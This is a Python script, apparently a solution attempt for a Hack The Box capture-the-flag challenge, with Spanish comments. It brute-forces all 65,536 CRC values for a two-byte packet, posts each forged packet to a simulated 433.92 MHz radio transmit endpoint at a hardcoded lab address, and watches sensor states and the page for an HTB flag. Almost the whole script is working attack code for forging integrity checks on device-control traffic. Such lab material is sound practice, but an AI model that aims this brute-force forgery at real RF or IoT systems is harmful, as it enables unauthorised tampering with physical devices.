#!/usr/bin/env python3
import requests
import struct
import time
import re

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 117: Bruteforce CRC completo para UN paquete
print("[*] INNOVACIÓN 117: Bruteforce completo de CRC para E1FF")
s = requests.Session()
s.get(base_url)

data = bytes([0xE1, 0xFF])

# Probar TODOS los CRC posibles (0x0000 a 0xFFFF)
# En bloques de 1000
for block in range(0, 0x10000, 1000):
    for crc_val in range(block, min(block + 1000, 0x10000)):
        packet = (data + struct.pack('<H', crc_val)).hex().upper()
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    
    # Cada 10000 paquetes, verificar
    if (block + 1000) % 10000 == 0:
        print(f"  [{block+1000}/{0x10000}] Tested...")
        r = s.get(base_url)
        sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
        
        if sensor_states != ['text-warning'] * 4 + ['text-success'] * 3:
            print(f"  [!!!] STATE CHANGED at CRC block {block}!")
            print(f"       States: {sensor_states}")
            
        if 'HTB{' in r.text:
            print(f"  [SUCCESS] Flag found in CRC range {block}-{block+1000}")
            print(re.findall(r'HTB\{[^}]+\}', r.text))
            break

print(f"\n[*] Bruteforce CRC completed")

# Verificar final
time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# También verificar updates
r = s.get(f'{base_url}/updates')
if 'HTB{' in r.text:
    print('[SUCCESS in updates]', re.findall(r'HTB\{[^}]+\}', r.text))
